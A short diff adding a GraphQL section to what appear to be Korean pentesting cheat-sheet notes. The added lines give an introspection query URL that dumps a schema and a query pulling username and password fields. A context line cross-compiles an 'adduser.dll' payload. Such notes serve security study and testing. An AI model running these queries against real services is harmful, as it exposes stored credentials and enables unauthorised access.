@@ -329,3 +329,18 @@ x86_64-w64-mingw32-gcc -shared ex.c -lws2_32 -o adduser.dll
 ```
   
 </details>
+
+---
+<details>
+  <summary><strong>Graphql</strong></summary>
+
+- `/query`를 붙여서 보기.
+```bash
+# query 확인
+http://example.com/graphql?query={__schema%20{%0atypes%20{%0aname%0akind%0adescription%0afields%20{%0aname%0a}%0a}%0a}%0a}
+
+# 소문자
+http://example.com/graphql?query={user{username,password}}
+```
+  
+</details>
